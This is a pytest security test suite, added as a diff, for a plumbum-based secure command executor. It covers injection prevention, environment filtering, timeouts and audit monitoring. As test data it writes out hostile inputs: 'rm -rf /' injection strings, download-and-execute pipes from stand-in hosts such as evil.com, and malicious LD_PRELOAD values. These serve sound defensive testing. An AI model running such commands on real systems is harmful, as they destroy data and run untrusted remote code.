@@ -1,0 +1,616 @@
+#!/usr/bin/env python3
+"""
+Comprehensive security test suite for subprocess alternatives.
+
+This test suite validates the security features of the plumbum integration
+and other secure subprocess alternatives, focusing on:
+- Command injection prevention
+- Resource limits and timeout handling
+- Audit logging and monitoring
+- Security validation and enforcement
+"""
+
+import tempfile
+from pathlib import Path
+from unittest.mock import Mock, patch
+
+import pytest
+
+from src.security.secure_execution import (
+    SecureExecutionError,
+    SecureExecutor,
+    SecureTempExecutor,
+    SecurityContext,
+    execute_secure_command,
+    validate_command_security,
+)
+from src.security.subprocess_utils import SecureSubprocessRunner, SecurityError, SecurityMonitor
+
+
+class TestCommandInjectionPrevention:
+    """Test command injection prevention capabilities."""
+
+    def test_shell_injection_prevention(self):
+        """Test prevention of shell injection attacks."""
+        executor = SecureExecutor()
+
+        # Test various shell injection patterns
+        injection_attempts = [
+            ["python", "-c", "import os; os.system('echo test')"],
+            ["python", "-c", "__import__('os').system('echo test')"],
+        ]
+
+        for cmd in injection_attempts:
+            # These should be allowed by validation (plumbum handles the security)
+            # but we should get warnings
+            validation = executor.validate_command(cmd)
+            assert validation.is_valid, f"Command should be valid but with warnings: {cmd}"
+
+    def test_argument_injection_prevention(self):
+        """Test prevention of argument injection attacks."""
+        executor = SecureExecutor()
+
+        # Test argument injection patterns
+        dangerous_args = [
+            ["python", "--version", "; rm -rf /"],
+            ["python", "--version", "$(rm -rf /)"],
+            ["python", "--version", "`rm -rf /`"],
+            ["python", "--version", "&& rm -rf /"],
+            ["python", "--version", "|| rm -rf /"],
+        ]
+
+        for cmd in dangerous_args:
+            validation = executor.validate_command(cmd)
+            # Should be valid but with warnings about dangerous characters
+            assert validation.is_valid
+            assert len(validation.warnings) > 0
+
+    def test_path_traversal_prevention(self):
+        """Test prevention of path traversal attacks."""
+        executor = SecureExecutor()
+
+        # Test path traversal in working directory
+        with pytest.raises(SecureExecutionError) as exc_info:
+            executor.execute_command(["python", "--version"], cwd=Path("/etc/passwd").parent)
+        assert "outside allowed base path" in str(exc_info.value)
+
+    def test_executable_whitelist_enforcement(self):
+        """Test enforcement of executable whitelist."""
+        # Create executor with restricted whitelist
+        context = SecurityContext(allowed_executables=["python", "pytest"])
+        executor = SecureExecutor(context)
+
+        # Test allowed executable
+        validation = executor.validate_command(["python", "--version"])
+        assert validation.is_valid
+
+        # Test disallowed executable
+        validation = executor.validate_command(["rm", "-rf", "/"])
+        assert not validation.is_valid
+        assert "not in the allowed list" in validation.error_message
+
+    def test_environment_variable_filtering(self):
+        """Test environment variable filtering for security."""
+        context = SecurityContext(environment_whitelist=["PATH", "SAFE_VAR"])
+        executor = SecureExecutor(context)
+
+        dangerous_env = {
+            "PATH": "/usr/bin",
+            "SAFE_VAR": "safe_value",
+            "LD_PRELOAD": "/malicious/lib.so",
+            "DYLD_INSERT_LIBRARIES": "/malicious/lib.dylib",
+            "PYTHONPATH": "/malicious/path",  # Not in whitelist
+        }
+
+        # Mock plumbum execution to test environment filtering
+        with patch("src.security.secure_execution.local") as mock_local:
+            mock_cmd = Mock()
+            mock_cmd_with_args = Mock()
+            mock_cmd_with_args.run.return_value = (0, "Success", "")
+            mock_cmd.__getitem__ = Mock(return_value=mock_cmd_with_args)
+            mock_local.__getitem__.return_value = mock_cmd
+
+            # Mock context managers
+            mock_local.cwd.return_value.__enter__ = Mock(return_value=None)
+            mock_local.cwd.return_value.__exit__ = Mock(return_value=None)
+            mock_local.env.return_value.__enter__ = Mock(return_value=None)
+            mock_local.env.return_value.__exit__ = Mock(return_value=None)
+
+            result = executor.execute_command(["python", "--version"], env=dangerous_env)
+
+            assert result.success
+            # Verify that only safe environment variables were passed
+            mock_local.env.assert_called()
+
+
+class TestResourceLimitsAndTimeouts:
+    """Test resource limits and timeout handling."""
+
+    def test_timeout_enforcement(self):
+        """Test command timeout enforcement."""
+        # Create executor with short timeout
+        context = SecurityContext(timeout=1)
+        executor = SecureExecutor(context)
+
+        # Mock a long-running command that times out
+        with patch("src.security.secure_execution.local") as mock_local:
+            from plumbum import ProcessExecutionError
+
+            mock_cmd = Mock()
+            mock_cmd_with_args = Mock()
+            # Simulate timeout by raising ProcessExecutionError
+            mock_cmd_with_args.run.side_effect = ProcessExecutionError(["sleep", "10"], 124, "", "Command timed out")
+            mock_cmd.__getitem__ = Mock(return_value=mock_cmd_with_args)
+            mock_local.__getitem__.return_value = mock_cmd
+
+            # Mock context managers
+            mock_local.cwd.return_value.__enter__ = Mock(return_value=None)
+            mock_local.cwd.return_value.__exit__ = Mock(return_value=None)
+            mock_local.env.return_value.__enter__ = Mock(return_value=None)
+            mock_local.env.return_value.__exit__ = Mock(return_value=None)
+
+            result = executor.execute_command(["sleep", "10"])
+
+            # Should return failed result, not raise exception
+            assert not result.success
+            assert result.returncode == 124  # Timeout exit code
+
+    def test_memory_limit_monitoring(self):
+        """Test memory limit monitoring with SecureSubprocessRunner."""
+        # Test with SecureSubprocessRunner which has memory monitoring
+        runner = SecureSubprocessRunner(max_memory_mb=128, timeout=10)
+
+        # Run a simple command that should succeed
+        result = runner.run(["python", "--version"])
+        assert result.returncode == 0
+
+        # Check that monitoring data is available
+        report = runner.get_security_report()
+        assert "total_commands" in report
+        assert report["total_commands"] > 0
+
+    def test_concurrent_execution_limits(self):
+        """Test limits on concurrent command execution."""
+        executor = SecureExecutor()
+
+        # Mock multiple concurrent executions
+        with patch("src.security.secure_execution.local") as mock_local:
+            mock_cmd = Mock()
+            mock_cmd_with_args = Mock()
+            mock_cmd_with_args.run.return_value = (0, "Success", "")
+            mock_cmd.__getitem__ = Mock(return_value=mock_cmd_with_args)
+            mock_local.__getitem__.return_value = mock_cmd
+
+            # Mock context managers
+            mock_local.cwd.return_value.__enter__ = Mock(return_value=None)
+            mock_local.cwd.return_value.__exit__ = Mock(return_value=None)
+            mock_local.env.return_value.__enter__ = Mock(return_value=None)
+            mock_local.env.return_value.__exit__ = Mock(return_value=None)
+
+            # Execute multiple commands sequentially to avoid memory issues
+            results = []
+            for _ in range(3):
+                result = executor.execute_command(["python", "--version"])
+                results.append(result)
+
+            # All should succeed
+            assert len(results) == 3
+            assert all(result.success for result in results)
+
+    def test_resource_cleanup_on_timeout(self):
+        """Test proper resource cleanup when commands timeout."""
+        with SecureTempExecutor() as executor:
+            # Create a temporary directory
+            temp_dir = executor.create_temp_directory()
+            assert temp_dir.exists()
+
+            # Mock a timeout scenario
+            with patch("src.security.secure_execution.local") as mock_local:
+                from plumbum import ProcessExecutionError
+
+                mock_cmd = Mock()
+                mock_cmd_with_args = Mock()
+                mock_cmd_with_args.run.side_effect = ProcessExecutionError(["sleep", "10"], 124, "", "Timeout")
+                mock_cmd.__getitem__ = Mock(return_value=mock_cmd_with_args)
+                mock_local.__getitem__.return_value = mock_cmd
+
+                # Mock context managers
+                mock_local.cwd.return_value.__enter__ = Mock(return_value=None)
+                mock_local.cwd.return_value.__exit__ = Mock(return_value=None)
+                mock_local.env.return_value.__enter__ = Mock(return_value=None)
+                mock_local.env.return_value.__exit__ = Mock(return_value=None)
+
+                result = executor.execute_command(["sleep", "10"], cwd=temp_dir)
+                assert not result.success
+
+        # Temp directory should be cleaned up after context exit
+        assert not temp_dir.exists()
+
+
+class TestAuditLoggingAndMonitoring:
+    """Test audit logging and monitoring capabilities."""
+
+    def test_command_execution_logging(self):
+        """Test logging of command executions for audit trail."""
+        with patch("src.security.secure_execution.logger") as mock_logger:
+            executor = SecureExecutor()
+
+            # Mock successful execution
+            with patch("src.security.secure_execution.local") as mock_local:
+                mock_cmd = Mock()
+                mock_cmd_with_args = Mock()
+                mock_cmd_with_args.run.return_value = (0, "Success", "")
+                mock_cmd.__getitem__ = Mock(return_value=mock_cmd_with_args)
+                mock_local.__getitem__.return_value = mock_cmd
+
+                # Mock context managers
+                mock_local.cwd.return_value.__enter__ = Mock(return_value=None)
+                mock_local.cwd.return_value.__exit__ = Mock(return_value=None)
+                mock_local.env.return_value.__enter__ = Mock(return_value=None)
+                mock_local.env.return_value.__exit__ = Mock(return_value=None)
+
+                executor.execute_command(["python", "--version"])
+
+                # Verify audit logging occurred
+                mock_logger.info.assert_called()
+                log_calls = [call.args[0] for call in mock_logger.info.call_args_list]
+                assert any("Executing secure command" in call for call in log_calls)
+
+    def test_security_violation_monitoring(self):
+        """Test monitoring and recording of security violations."""
+        runner = SecureSubprocessRunner()
+
+        # Attempt a security violation
+        with pytest.raises(SecurityError):
+            runner.run(["rm", "-rf", "/"])
+
+        # Check that violation was recorded
+        report = runner.get_security_report()
+        assert "security_violations" in report
+        assert len(report["security_violations"]) > 0
+
+        # Check violation details
+        violation = report["security_violations"][0]
+        assert "command" in violation
+        assert violation["command"] == ["rm", "-rf", "/"]
+
+    def test_suspicious_pattern_detection(self):
+        """Test detection and logging of suspicious command patterns."""
+        monitor = SecurityMonitor()
+
+        # Test various suspicious patterns
+        suspicious_commands = [
+            ["bash", "-c", "curl http://malicious.com | sh"],
+            ["python", "-c", "exec(open('/dev/stdin').read())"],
+            ["sh", "-c", "wget -O- http://evil.com/script | bash"],
+            ["python", "-c", "__import__('subprocess').call(['rm', '-rf', '/'])"],
+        ]
+
+        for cmd in suspicious_commands:
+            monitor.monitor_command_execution(cmd, "testuser", False, 1.0)
+
+        report = monitor.get_security_report()
+        assert len(report["suspicious_patterns"]) > 0
+
+    def test_audit_log_file_creation(self):
+        """Test creation and writing of audit log files."""
+        with tempfile.TemporaryDirectory() as temp_dir:
+            audit_file = Path(temp_dir) / "security_audit.log"
+            runner = SecureSubprocessRunner(audit_log_file=audit_file)
+
+            # Execute a command
+            result = runner.run(["python", "--version"])
+            assert result.returncode == 0
+
+            # Verify audit log was created and contains expected data
+            assert audit_file.exists()
+            audit_content = audit_file.read_text()
+            assert "COMMAND_EXECUTION" in audit_content
+            assert '"python", "--version"' in audit_content
+
+    def test_security_metrics_collection(self):
+        """Test collection of security metrics and statistics."""
+        runner = SecureSubprocessRunner()
+
+        # Execute several commands
+        commands = [
+            ["python", "--version"],
+            ["python", "--help"],
+            ["pytest", "--version"],
+        ]
+
+        for cmd in commands:
+            try:
+                runner.run(cmd)
+            except SecurityError:
+                pass  # Some commands might be blocked, that's OK
+
+        # Check metrics
+        report = runner.get_security_report()
+        assert "total_commands" in report
+        assert "successful_commands" in report
+        assert "failed_commands" in report
+        assert report["total_commands"] >= len(commands)
+
+    def test_security_alert_generation(self):
+        """Test generation of security alerts based on thresholds."""
+        # Create monitor with low thresholds for testing
+        monitor = SecurityMonitor(
+            alert_thresholds={
+                "max_violations_per_hour": 1,
+                "max_blocked_commands_per_hour": 1,
+                "suspicious_pattern_threshold": 1,
+            }
+        )
+
+        # Trigger security violations
+        monitor.monitor_security_violation(
+            "command_blocked",
+            {"command": ["rm", "-rf", "/"], "reason": "dangerous_command"},
+        )
+
+        monitor.monitor_security_violation(
+            "suspicious_pattern",
+            {"command": ["bash", "-c", "curl | sh"], "pattern": "download_and_execute"},
+        )
+
+        # Check for generated alerts
+        alerts = monitor.check_alerts()
+        assert len(alerts) > 0
+
+        # Verify alert structure
+        for alert in alerts:
+            assert "alert_type" in alert
+            assert "timestamp" in alert
+            assert "details" in alert
+
+
+class TestPlumbumIntegrationSecurity:
+    """Test security features specific to plumbum integration."""
+
+    def test_plumbum_command_validation(self):
+        """Test plumbum-specific command validation."""
+        executor = SecureExecutor()
+
+        # Test that plumbum commands are properly validated
+        validation = executor.validate_command(["python", "--version"])
+        assert validation.is_valid
+
+        # Test invalid executable
+        validation = executor.validate_command(["nonexistent_command"])
+        assert not validation.is_valid
+
+    def test_plumbum_argument_escaping(self):
+        """Test that plumbum properly escapes arguments."""
+        executor = SecureExecutor()
+
+        # Mock plumbum execution to verify argument handling
+        with patch("src.security.secure_execution.local") as mock_local:
+            mock_cmd = Mock()
+            mock_cmd_with_args = Mock()
+            mock_cmd_with_args.run.return_value = (0, "Success", "")
+            mock_cmd.__getitem__ = Mock(return_value=mock_cmd_with_args)
+            mock_local.__getitem__.return_value = mock_cmd
+
+            # Mock context managers
+            mock_local.cwd.return_value.__enter__ = Mock(return_value=None)
+            mock_local.cwd.return_value.__exit__ = Mock(return_value=None)
+            mock_local.env.return_value.__enter__ = Mock(return_value=None)
+            mock_local.env.return_value.__exit__ = Mock(return_value=None)
+
+            # Execute command with potentially dangerous arguments
+            dangerous_args = ["python", "-c", "print('hello; rm -rf /')"]
+            result = executor.execute_command(dangerous_args)
+
+            # Verify plumbum was called correctly
+            mock_cmd.__getitem__.assert_called_with(["-c", "print('hello; rm -rf /')"])
+            assert result.success
+
+    def test_plumbum_error_handling(self):
+        """Test plumbum error handling and security implications."""
+        executor = SecureExecutor()
+
+        # Mock plumbum ProcessExecutionError
+        with patch("src.security.secure_execution.local") as mock_local:
+            from plumbum import ProcessExecutionError
+
+            mock_cmd = Mock()
+            mock_cmd_with_args = Mock()
+            mock_cmd_with_args.run.side_effect = ProcessExecutionError(
+                ["python", "nonexistent.py"], 2, "", "File not found"
+            )
+            mock_cmd.__getitem__ = Mock(return_value=mock_cmd_with_args)
+            mock_local.__getitem__.return_value = mock_cmd
+
+            # Mock context managers
+            mock_local.cwd.return_value.__enter__ = Mock(return_value=None)
+            mock_local.cwd.return_value.__exit__ = Mock(return_value=None)
+            mock_local.env.return_value.__enter__ = Mock(return_value=None)
+            mock_local.env.return_value.__exit__ = Mock(return_value=None)
+
+            result = executor.execute_command(["python", "nonexistent.py"])
+
+            # Should handle error gracefully
+            assert not result.success
+            assert result.returncode == 2
+            assert "File not found" in result.stderr
+
+    def test_plumbum_shell_false_enforcement(self):
+        """Test that plumbum never uses shell=True equivalent."""
+        executor = SecureExecutor()
+
+        # Plumbum doesn't have shell=True equivalent, but we test that
+        # shell metacharacters don't cause shell interpretation
+        with patch("src.security.secure_execution.local") as mock_local:
+            mock_cmd = Mock()
+            mock_cmd_with_args = Mock()
+            mock_cmd_with_args.run.return_value = (0, "literal output", "")
+            mock_cmd.__getitem__ = Mock(return_value=mock_cmd_with_args)
+            mock_local.__getitem__.return_value = mock_cmd
+
+            # Mock context managers
+            mock_local.cwd.return_value.__enter__ = Mock(return_value=None)
+            mock_local.cwd.return_value.__exit__ = Mock(return_value=None)
+            mock_local.env.return_value.__enter__ = Mock(return_value=None)
+            mock_local.env.return_value.__exit__ = Mock(return_value=None)
+
+            # Command with shell metacharacters
+            result = executor.execute_command(["echo", "hello && rm -rf /"])
+
+            # Should treat the entire string as a literal argument
+            assert result.success
+            mock_cmd.__getitem__.assert_called_with(["hello && rm -rf /"])
+
+
+class TestSecurityContextManagement:
+    """Test security context management and configuration."""
+
+    def test_security_context_defaults(self):
+        """Test default security context configuration."""
+        context = SecurityContext()
+
+        # Check default allowed executables
+        assert "python" in context.allowed_executables
+        assert "hatch" in context.allowed_executables
+        assert "pytest" in context.allowed_executables
+
+        # Check default environment whitelist
+        assert "PATH" in context.environment_whitelist
+        assert "PYTHONPATH" in context.environment_whitelist
+
+        # Check default limits
+        assert context.timeout == 300
+        assert context.base_path == Path.cwd()
+
+    def test_security_context_customization(self):
+        """Test customization of security context."""
+        custom_executables = ["python", "git"]
+        custom_env = ["PATH", "HOME"]
+        custom_timeout = 60
+        custom_base = Path("/tmp")
+
+        context = SecurityContext(
+            allowed_executables=custom_executables,
+            environment_whitelist=custom_env,
+            timeout=custom_timeout,
+            base_path=custom_base,
+            max_memory_mb=256,
+        )
+
+        assert context.allowed_executables == custom_executables
+        assert context.environment_whitelist == custom_env
+        assert context.timeout == custom_timeout
+        assert context.base_path == custom_base
+        assert context.max_memory_mb == 256
+
+    def test_security_context_updates(self):
+        """Test runtime updates to security context."""
+        executor = SecureExecutor()
+        original_timeout = executor.security_context.timeout
+
+        # Update timeout
+        executor.update_security_context(timeout=120)
+        assert executor.security_context.timeout == 120
+        assert executor.security_context.timeout != original_timeout
+
+        # Update allowed executables
+        new_executables = ["python", "git", "curl"]
+        executor.update_security_context(allowed_executables=new_executables)
+        assert executor.security_context.allowed_executables == new_executables
+
+    def test_security_context_validation(self):
+        """Test validation of security context parameters."""
+        # Test with invalid parameters
+        executor = SecureExecutor()
+
+        # Should handle invalid parameters gracefully
+        with patch("src.security.secure_execution.logger") as mock_logger:
+            executor.update_security_context(invalid_param="value")
+            mock_logger.warning.assert_called()
+
+
+class TestIntegrationWithExistingCode:
+    """Test integration with existing codebase and compatibility."""
+
+    def test_convenience_function_integration(self):
+        """Test convenience functions work with security features."""
+        # Test execute_secure_command
+        with patch("src.security.secure_execution.local") as mock_local:
+            mock_cmd = Mock()
+            mock_cmd_with_args = Mock()
+            mock_cmd_with_args.run.return_value = (0, "Success", "")
+            mock_cmd.__getitem__ = Mock(return_value=mock_cmd_with_args)
+            mock_local.__getitem__.return_value = mock_cmd
+
+            # Mock context managers
+            mock_local.cwd.return_value.__enter__ = Mock(return_value=None)
+            mock_local.cwd.return_value.__exit__ = Mock(return_value=None)
+            mock_local.env.return_value.__enter__ = Mock(return_value=None)
+            mock_local.env.return_value.__exit__ = Mock(return_value=None)
+
+            result = execute_secure_command(["python", "--version"])
+            assert result.success
+
+        # Test validate_command_security
+        validation = validate_command_security(["python", "--version"])
+        assert validation.is_valid
+
+    def test_temp_executor_integration(self):
+        """Test SecureTempExecutor integration and cleanup."""
+        with SecureTempExecutor() as executor:
+            # Create temp directory
+            temp_dir = executor.create_temp_directory("_test")
+            assert temp_dir.exists()
+            assert "_test" in temp_dir.name
+
+            # Execute command in temp directory
+            with patch("src.security.secure_execution.local") as mock_local:
+                mock_cmd = Mock()
+                mock_cmd_with_args = Mock()
+                mock_cmd_with_args.run.return_value = (0, "Success", "")
+                mock_cmd.__getitem__ = Mock(return_value=mock_cmd_with_args)
+                mock_local.__getitem__.return_value = mock_cmd
+
+                # Mock context managers
+                mock_local.cwd.return_value.__enter__ = Mock(return_value=None)
+                mock_local.cwd.return_value.__exit__ = Mock(return_value=None)
+                mock_local.env.return_value.__enter__ = Mock(return_value=None)
+                mock_local.env.return_value.__exit__ = Mock(return_value=None)
+
+                result = executor.execute_command(["python", "--version"], cwd=temp_dir)
+                assert result.success
+
+            temp_path = temp_dir  # Store reference for later check
+
+        # After context exit, temp directory should be cleaned up
+        assert not temp_path.exists()
+
+    def test_backward_compatibility(self):
+        """Test backward compatibility with existing subprocess usage."""
+        # Test that SecureExecutor can be used as drop-in replacement
+        executor = SecureExecutor()
+
+        # Mock execution for compatibility test
+        with patch("src.security.secure_execution.local") as mock_local:
+            mock_cmd = Mock()
+            mock_cmd_with_args = Mock()
+            mock_cmd_with_args.run.return_value = (0, "Python 3.12", "")
+            mock_cmd.__getitem__ = Mock(return_value=mock_cmd_with_args)
+            mock_local.__getitem__.return_value = mock_cmd
+
+            # Mock context managers
+            mock_local.cwd.return_value.__enter__ = Mock(return_value=None)
+            mock_local.cwd.return_value.__exit__ = Mock(return_value=None)
+            mock_local.env.return_value.__enter__ = Mock(return_value=None)
+            mock_local.env.return_value.__exit__ = Mock(return_value=None)
+
+            # Should work like subprocess.run equivalent
+            result = executor.execute_command(["python", "--version"])
+
+            assert result.success
+            assert result.returncode == 0
+            assert "Python" in result.stdout
+
+
+if __name__ == "__main__":
+    pytest.main([__file__, "-v"])
